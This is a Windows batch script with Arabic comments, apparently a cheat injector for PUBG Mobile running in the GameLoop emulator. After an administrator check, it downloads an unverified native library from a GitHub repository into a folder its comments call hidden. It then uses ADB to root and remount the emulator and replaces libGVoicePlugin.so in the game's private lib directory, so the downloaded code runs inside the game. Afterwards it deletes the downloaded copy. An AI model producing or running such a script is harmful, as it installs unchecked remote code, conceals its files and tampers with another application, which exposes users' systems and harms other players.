@echo off
:: قراءة مسار المحاكي من redit.txt
set "reditFile=C:\Windows\System32\config\systemprofile\redit.txt"
set /p gameLoopPath=<"%reditFile%"

:: إذا لم يتم العثور على الملف، استخدم المسار الافتراضي
if not defined gameLoopPath set "gameLoopPath=C:\Program Files\TxGameAssistant\ui"

:: التحقق من صلاحيات المسؤول
fltmc >nul 2>&1
if not %errorlevel%==0 (
    echo يرجى تشغيل هذا الملف كمسؤول.
    pause
    exit
)

:: تحديد المسار المخفي لحفظ الملف
set hiddenPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\SystemTools
if not exist "%hiddenPath%" mkdir "%hiddenPath%"

:: تحديد اسم الملف
set fileName=libGVoicePlugin.so

:: تحميل الملف باستخدام PowerShell
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/jack74512/UAO7/raw/refs/heads/main/%fileName%' -OutFile '%hiddenPath%\%fileName%'"

:: التحقق من نجاح التحميل
if not exist "%hiddenPath%\%fileName%" (
    echo فشل في تحميل الملف.
    exit /b
)

:: ضبط مسار ADB استنادًا إلى مسار المحاكي
set "ADB_PATH=%gameLoopPath%\adb.exe"

:: بدء أوامر ADB
"%ADB_PATH%" kill-server
"%ADB_PATH%" start-server
"%ADB_PATH%" root
"%ADB_PATH%" remount
"%ADB_PATH%" push "%hiddenPath%\%fileName%" /data/local/tmp/
"%ADB_PATH%" shell mv /data/local/tmp/%fileName% /data/data/com.tencent.ig/lib/

:: تنظيف المسار المخفي
if exist "%hiddenPath%\%fileName%" del "%hiddenPath%\%fileName%"

echo.
echo جميع الأوامر تم تنفيذها بنجاح!
pause
